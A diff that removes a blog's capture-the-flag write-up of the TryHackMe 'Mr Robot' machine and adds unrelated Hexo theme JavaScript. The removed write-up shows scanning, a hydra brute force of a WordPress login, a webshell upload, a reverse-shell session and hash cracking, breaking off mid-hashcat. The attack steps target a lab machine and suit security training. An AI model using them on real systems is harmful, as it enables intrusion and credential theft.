@@ -1,305 +1,161 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Mr-Robot-ctf | hackboy</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners&#x2F;intermediate users. There are 3 hidden keys located on the machine, can you find them?你能扎根这台机器人先生风格的机器吗？这">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Mr-Robot-ctf">
-<meta property="og:url" content="http://example.com/2023/08/03/Mr-Robot-ctf/index.html">
-<meta property="og:site_name" content="hackboy">
-<meta property="og:description" content="Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners&#x2F;intermediate users. There are 3 hidden keys located on the machine, can you find them?你能扎根这台机器人先生风格的机器吗？这">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/pic/image-20230803092512829.png">
-<meta property="og:image" content="http://example.com/pic/image-20230803093908230.png">
-<meta property="og:image" content="http://example.com/pic/image-20230803093846913.png">
-<meta property="og:image" content="http://example.com/pic/image-20230803094708765.png">
-<meta property="og:image" content="http://example.com/pic/image-20230803135724769.png">
-<meta property="og:image" content="http://example.com/pic/image-20230803135726657.png">
-<meta property="article:published_time" content="2023-08-03T00:19:22.000Z">
-<meta property="article:modified_time" content="2023-08-03T07:21:21.114Z">
-<meta property="article:author" content="honkerZ">
-<meta property="article:tag" content="tryhackme">
-<meta property="article:tag" content="webshell">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/pic/image-20230803092512829.png">
-  
-    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+const { Component } = require('inferno');
+const classname = require('hexo-component-inferno/lib/util/classname');
+const Head = require('./common/head');
+const Navbar = require('./common/navbar');
+const Widgets = require('./common/widgets');
+const Footer = require('./common/footer');
+const Scripts = require('./common/scripts');
+const Search = require('./common/search');
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+module.exports = class extends Component {
+    render() {
+        const { site, config, page, helper, body } = this.props;
+        const { comment, use_pjax, has_banner } = config;
+        const { __, my_cdn, url_for } = helper;
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+        // 默认不加载公式，文中头部开启mathJax:true才加载
+        var isMath = page.mathJax != undefined && page.mathJax;
+        const language = page.lang || page.language || config.language;
+        const columnCount = Widgets.getColumnCount(config.widgets);
+        const hasComment = comment != undefined && comment.type != undefined && (comment.type == 'gitalk' || comment.type == 'valine')
+            && (comment.has_hot_recommend || comment.has_latest_comment);
+        var appKey;
+        var appId;
+        var userName;
+        var userRepo;
+        var isValine;
 
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+        if (comment != undefined && comment.type != undefined && comment.type == 'gitalk') {
+            appId = comment.client_id;
+            appKey = comment.client_secret;
+            userName = comment.owner;;
+            userRepo = comment.repo;
+            isValine = false;
+        } else if (comment != undefined && comment.type != undefined && comment.type == 'valine') {
+            appId = comment.app_id;
+            appKey = comment.app_key;
+            userName = comment.owner;
+            isValine = true;
+        }
+        var hotTitle = __('widget.hot_recommend');
+        var hotTip = __('widget.hot_recommend_tip');
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">hackboy</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">hacking...</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        // =====index hot_recommend
+        var hotRecommendStr =
+            `<div class="card widget">
+            <div class="card-content">
+                <h3 class="menu-label">${hotTitle}</h3><span id="index_hot_div">${hotTip}</span>
+            </div>
+        </div>`;
+
+        // =====index banner
+        var bannerStr =
+            `<div class="card widget">
+            <div class="card-content1 card-image">
+                <span id="banner"><div class="card-content ">Banner ${hotTip}</div></span>
+            </div>
+        </div>`;
         
-          <a class="main-nav-link" href="/">Home</a>
+        // mathjax support 使用方法 md文章头部开启mathJax: true，md文章中公式格式：$$f(x) = a_1x^n + a_2x^{n-1} + a_3x^{n-2}$$
+        var mathJaxJs = `function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };loadMathJax();`;
+
+        var pjaxJs = `var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
         
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(${hasComment}){
+                $.getScript('${my_cdn(url_for('/js/comment-issue-data.js'))}',function(){loadIssueData('${appId}','${appKey}','${userName}','${userRepo}',${isValine});});
+            }
+            if(${isMath}){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });`;
 
-      <div class="outer">
-        <section id="main"><article id="post-Mr-Robot-ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/08/03/Mr-Robot-ctf/" class="article-date">
-  <time class="dt-published" datetime="2023-08-03T00:19:22.000Z" itemprop="datePublished">2023-08-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      Mr-Robot-ctf
-    </h1>
-  
+        if (comment == undefined || comment.type == undefined
+            || comment.type != 'gitalk'
+            || comment.has_hot_recommend == undefined
+            || !comment.has_hot_recommend) {
+            hotRecommendStr = '';
+        }
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners&#x2F;intermediate users. There are 3 hidden keys located on the machine, can you find them?<br>你能扎根这台机器人先生风格的机器吗？这是一个面向初学者&#x2F;中级用户的虚拟机。机器上有3个隐藏的钥匙，你能找到它们吗？</p>
-<p>Credit to <a target="_blank" rel="noopener" href="https://twitter.com/@sho_luv">Leon Johnson</a> for creating this machine. <strong>This machine is used here with the explicit permission of the creator &lt;3</strong><br>感谢Leon Johnson创造了这台机器。此机器在创建者的明确许可下在此处使用 &lt;3</p>
-<p>1.扫描端口</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -T4 -sC -sV 10.10.135.133</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-08-03</span> <span class="number">09</span>:<span class="number">21</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">135.133</span></span><br><span class="line">Host is up (<span class="number">0.28</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line"><span class="number">22</span>/tcp  closed ssh</span><br><span class="line"><span class="number">80</span>/tcp  open   http     Apache httpd</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">443/tcp open   ssl/http Apache httpd</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=www.example.com</span><br><span class="line">| Not valid before: <span class="number">2015</span><span class="literal">-09-16T10</span>:<span class="number">45</span>:<span class="number">03</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-09-13T10</span>:<span class="number">45</span>:<span class="number">03</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">45.83</span> seconds</span><br></pre></td></tr></table></figure>
+        var indexTopData = hotRecommendStr;
 
-<p>2.查看网页</p>
-<p><img src="/../pic/image-20230803092512829.png" alt="image-20230803092512829"></p>
-<p>emmmm….有点魔幻</p>
-<p>扫描目录</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.135.133/</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">10.10</span>.<span class="number">135.133</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">03</span> <span class="number">09</span>:<span class="number">31</span>:<span class="number">08</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">236</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">images</span>/]</span><br><span class="line">/blog                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">234</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">blog</span>/]</span><br><span class="line">/sitemap              (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">0</span>]</span><br><span class="line">/rss                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">feed</span>/]</span><br><span class="line">/login                (Status: <span class="number">302</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">wp</span>-<span class="type">login.php</span>]                                                                                 </span><br><span class="line">/<span class="number">0</span>                    (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="number">0</span>/]</span><br><span class="line">/feed                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">feed</span>/]</span><br><span class="line">/video                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">235</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">video</span>/]</span><br><span class="line">/image                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">image</span>/]</span><br><span class="line">/atom                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">feed</span>/<span class="type">atom</span>/]</span><br><span class="line">/wp<span class="literal">-content</span>           (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">240</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">wp</span>-<span class="type">content</span>/]                                                                                </span><br><span class="line">/admin                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">235</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">admin</span>/]</span><br><span class="line">/audio                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">235</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">audio</span>/]</span><br><span class="line">/intro                (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">516314</span>]</span><br><span class="line">/wp<span class="literal">-login</span>             (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">2613</span>]</span><br><span class="line">/css                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">233</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">css</span>/]</span><br><span class="line">/rss2                 (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">feed</span>/]</span><br><span class="line">/license              (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">309</span>]</span><br><span class="line">/wp<span class="literal">-includes</span>          (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">241</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">wp</span>-<span class="type">includes</span>/]                                                                               </span><br><span class="line">/js                   (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">232</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">js</span>/]</span><br><span class="line">/Image                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">Image</span>/]</span><br><span class="line">/rdf                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">feed</span>/<span class="type">rdf</span>/]</span><br><span class="line">/page1                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/]</span><br><span class="line">/readme               (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">64</span>]</span><br><span class="line">/robots               (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">41</span>]</span><br><span class="line">/dashboard            (Status: <span class="number">302</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/<span class="type">wp</span>-<span class="type">admin</span>/]</span><br><span class="line">/%<span class="number">20</span>                  (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">0</span>] [--&gt; <span class="type">http</span>://<span class="number">10.10</span><span class="type">.135.133</span>/]</span><br><span class="line">Progress: <span class="number">6943</span> / <span class="number">220561</span> (<span class="number">3.15</span>%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">03</span> <span class="number">09</span>:<span class="number">35</span>:<span class="number">18</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+        const hasBanner = has_banner != undefined && has_banner;
 
-<p>查看网页</p>
-<p><img src="/../pic/image-20230803093908230.png" alt="image-20230803093908230"></p>
-<p><img src="/../pic/image-20230803093846913.png" alt="image-20230803093846913"></p>
-<p>那么什么是有效的用户名？CTF本身的灵感来自电视节目“机器人先生”，主角的名字是艾略特（即使我从观看节目中已经不知道，在互联网上很容易搜索），所以让我们尝试一下。</p>
-<p><img src="/../pic/image-20230803094708765.png" alt="image-20230803094708765"></p>
-<p>用hydra爆破<img src="/../pic/image-20230803135724769.png" alt="image-20230803135724769"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                                        </span><br><span class="line">┌──(root㉿kali)-[/home/ace/下载]</span><br><span class="line">└─# hydra -l Elliot -P fsocity.dic.uniq \</span><br><span class="line">-s 80 10.10.184.29 http-post-form -t 30 \</span><br><span class="line">&#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:The password you entered for the username&#x27;</span><br><span class="line">Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-03 13:25:33</span><br><span class="line">[ERROR] File for passwords not found: fsocity.dic.uniq</span><br><span class="line">                                                                                                                                                                        </span><br><span class="line">┌──(root㉿kali)-[/home/ace/下载]</span><br><span class="line">└─# hydra -l Elliot -P fsocity.dic \     </span><br><span class="line">-s 80 10.10.184.29 http-post-form -t 30 \</span><br><span class="line">&#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:The password you entered for the username&#x27;</span><br><span class="line">Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-03 13:25:43</span><br><span class="line">[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:1/p:858235), ~28608 tries per task</span><br><span class="line">[DATA] attacking http-post-form://10.10.184.29:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:The password you entered for the username</span><br><span class="line">[STATUS] 1122.00 tries/min, 1122 tries in 00:01h, 857113 to do in 12:44h, 30 active</span><br><span class="line">[STATUS] 1115.00 tries/min, 3345 tries in 00:03h, 854890 to do in 12:47h, 30 active</span><br><span class="line">[STATUS] 1009.57 tries/min, 7067 tries in 00:07h, 851168 to do in 14:04h, 30 active</span><br><span class="line">^C^CThe session file ./hydra.restore was written. Type &quot;hydra -R&quot; to resume session.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        if (indexTopData == '' && hasBanner) {
+            indexTopData = bannerStr;
+        }
 
-<p>时间太久了，用已经有的密码吧</p>
-<p>密码：<strong>ER28-0652</strong></p>
-<p>3.通过网页得到shell</p>
-<p><img src="/../pic/image-20230803135726657.png" alt="image-20230803135726657"></p>
-<p>上传kali的webshell，wp的404漏洞</p>
-<p>访问网页：</p>
-<p>本地监听：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">usr</span>/<span class="type">share</span>/<span class="type">webshells</span>/<span class="type">php</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 4444                 </span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.18</span><span class="type">.75.12</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.184.29</span>] <span class="number">48435</span></span><br><span class="line">Linux linux <span class="number">3.13</span>.<span class="number">0</span><span class="literal">-55-generic</span> <span class="comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> <span class="number">06</span>:<span class="number">30</span>:<span class="number">47</span> up  <span class="number">1</span>:<span class="number">12</span>,  <span class="number">0</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.01</span>, <span class="number">0.05</span></span><br><span class="line">USER     TTY      FROM             LOGIN<span class="selector-tag">@</span>   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=<span class="number">1</span>(daemon) gid=<span class="number">1</span>(daemon) groups=<span class="number">1</span>(daemon)</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br><span class="line"><span class="string">daemon@linux:/$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var</span></span><br><span class="line"><span class="string">boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz</span></span><br><span class="line"><span class="string">daemon@linux:/$ cd home</span></span><br><span class="line"><span class="string">cd home</span></span><br><span class="line"><span class="string">daemon@linux:/home$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">robot</span></span><br><span class="line"><span class="string">daemon@linux:/home$ cd robot</span></span><br><span class="line"><span class="string">cd robot</span></span><br><span class="line"><span class="string">daemon@linux:/home/robot$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">key-2-of-3.txt  password.raw-md5</span></span><br><span class="line"><span class="string">daemon@linux:/home/robot$ cat key-2-of-3.txt</span></span><br><span class="line"><span class="string">cat key-2-of-3.txt</span></span><br><span class="line"><span class="string">cat: key-2-of-3.txt: Permission denied</span></span><br><span class="line"><span class="string">daemon@linux:/home/robot$ cat password.raw-ma5</span></span><br><span class="line"><span class="string">cat password.raw-ma5</span></span><br><span class="line"><span class="string">cat: password.raw-ma5: No such file or directory</span></span><br><span class="line"><span class="string">daemon@linux:/home/robot$ cat password.raw-md5</span></span><br><span class="line"><span class="string">cat password.raw-md5</span></span><br><span class="line"><span class="string">robot:c3fcd3d76192e4007dfb496cca67e13b</span></span><br></pre></td></tr></table></figure>
+        if (page.path != 'index.html') {
+            indexTopData = '';
+        }
 
-<p>md5解密得到密码</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌─[<span class="type">root</span>@<span class="type">parrort</span>-<span class="type">vmwarevirtualplatform</span>]─[/<span class="type">home</span>/<span class="type">parrort</span>/<span class="type">Desktop</span>]</span><br><span class="line">└──╼ <span class="comment">#hashcat c3fcd3d76192e4007dfb496cca67e13b  -m 0 rockyou.txt --force</span></span><br><span class="line">hashcat (v6.<span class="number">1.1</span>) starting...</span><br><span class="line"></span><br><span class="line">You have enabled <span class="literal">--force</span> to bypass dangerous warnings and errors!</span><br><span class="line">This can hide serious problems and should only be done when debugging.</span><br><span class="line"><span class="keyword">Do</span> not report hashcat issues encountered when <span class="keyword">using</span> --force.</span><br><span class="line">OpenCL API (OpenCL <span class="number">1.2</span> pocl <span class="number">1.6</span>, None+Asserts, LLVM <span class="number">9.0</span>.<span class="number">1</span>, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-13th Gen Intel(R) Core(TM) i5-13500H, 2855/2919 MB (1024 MB allocatable), 1MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: <span class="number">0</span></span><br><span class="line">Maximum password length supported by kernel: <span class="number">256</span></span><br><span class="line"></span><br><span class="line">Hashes: <span class="number">1</span> digests; <span class="number">1</span> unique digests, <span class="number">1</span> unique salts</span><br><span class="line">Bitmaps: <span class="number">16</span> bits, <span class="number">65536</span> entries, 